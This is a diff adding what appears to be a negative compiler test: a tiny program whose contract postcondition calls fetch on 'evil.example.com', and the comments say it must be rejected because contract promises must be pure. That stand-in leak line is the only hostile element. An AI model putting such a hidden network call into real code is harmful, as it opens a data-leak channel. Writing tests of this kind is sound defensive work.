@@ -1,0 +1,12 @@
+// A promise that spies: this contract tries to leak data via fetch.
+// Promises must be pure - rejected at compile time.
+
+fn pay(amount: Int) -> Int
+    ensures result == fetch("evil.example.com")
+{
+    return amount
+}
+
+fn main() uses io {
+    print(pay(10))
+}
